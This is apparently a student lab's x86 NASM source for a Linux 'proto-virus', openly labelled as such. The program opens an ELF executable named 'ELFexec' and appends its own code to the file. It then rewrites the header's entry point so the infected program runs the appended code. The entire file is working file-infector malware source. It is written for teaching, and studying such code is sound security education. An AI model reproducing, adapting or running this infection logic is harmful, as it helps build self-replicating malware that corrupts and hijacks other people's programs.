%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define STDOUT 1
%define STDERR 2
%define fd [ebp-4]
%define buffer [ebp-8]
%define fileSize [ebp-12]
%define virusSize [ebp-14]
%define headerSize 52
%define headerbuffer [ebp-66]
%define oldAdress [ebp-70]

	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

call get_my_loc 
sub ecx, anchor - virusStr  	
write STDOUT, ecx, 17           ; print "this is a virus"

call get_my_loc 				; position independent code procedure
sub ecx, anchor	- FileName		
mov eax, ecx
open eax, RDWR, 0x700           ; open the file
cmp eax, 0
jl open_error                   ; jump less - error	

mov fd, eax                     ; save the fd in the stack 

lea ebx, buffer                 ; mov pointer to buffer	
read eax, ebx, 4                ; check the magic number	
cmp eax, 4
jl read_error
cmp dword buffer, 0x464c457f	; compare to magic number
jne elf_error					; if not equal, go to error

mov eax, fd
lseek eax, 0, 2                 ; go to the end of the file
mov eax, (virus_end - _start)   ; save the size of the file in eax
mov virusSize, eax				; save size of file on stack

call get_my_loc					; position independent code procedure
sub ecx, anchor - _start        ; save the size of the virus in ecx

mov ebx, fd						; save pointer to file in ebx
mov edx, eax					; move the size of the file to edx because of the macro
write ebx, ecx, edx             ; write the virus to the infected file
cmp eax, virusSize				; check if all the file was written to the file
jl write_error					; if less than the size of the file, go to error

lseek ebx, 0, 0                 ; go to the start of the file
lea ecx, headerbuffer			; get address of the header buffer
read ebx, ecx, headerSize       ; read elf header of the infected file
lea ecx, headerbuffer			; get back address of header buffer after the macro
mov eax, dword[ecx+24]			; get old entry point
mov oldAdress, eax				; save it on stack
mov dword[ecx+24], 0x08048294   ; move to the entry point of the infected file the address of _start 

mov ebx, fd						
lseek ebx, 0, 0					; get to the start of the file
lea ecx, headerbuffer			; get address of headre buffer
mov edx, headerSize				; move to edx size of the header
write ebx, ecx, edx				; write the fixed heder to file
cmp eax, headerSize				; check if all the header was written
jl write_error					; jump to error if not

close ebx						; close file
cmp eax, 0						; check if error
jl close_error					; if error -> jump to error

VirusExit:
       exit 0            		; Termination if all is OK and no previous code to jump to
                         		; (also an example for use of above macros)

open_error:
    call get_my_loc
    sub ecx, anchor - open_errorSTR
	write STDERR, ecx, 24
	exit 1

read_error:
    call get_my_loc
    sub ecx, anchor - read_errorSTR
	write STDERR, ecx, 29
	exit 1 

elf_error:
    call get_my_loc
    sub ecx, anchor - elf_errorSTR
	write STDERR, ecx, 24
	exit 1
	
write_error:
    call get_my_loc
    sub ecx, anchor - write_errorSTR
	write STDERR, ecx, 28
	exit 1

close_error:
    call get_my_loc
    sub ecx, anchor - close_errorSTR
	write STDERR, ecx, 25
	exit 1



FileName:	db "ELFexec", 0
virusStr: db "This is a virus", 10, 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
open_errorSTR: 	db "Error: Can't open file", 10, 0
read_errorSTR: db "Error: Can't read from file", 10, 0
write_errorSTR: db "Error: Can't write to file", 10, 0
close_errorSTR: db "Error: Can't close file", 10, 0
elf_errorSTR: 	db "Error: Not an ELF file", 10, 0
	
get_my_loc:
	call anchor
anchor: 
	pop ecx
	ret
	
PreviousEntryPoint: dd VirusExit
virus_end:
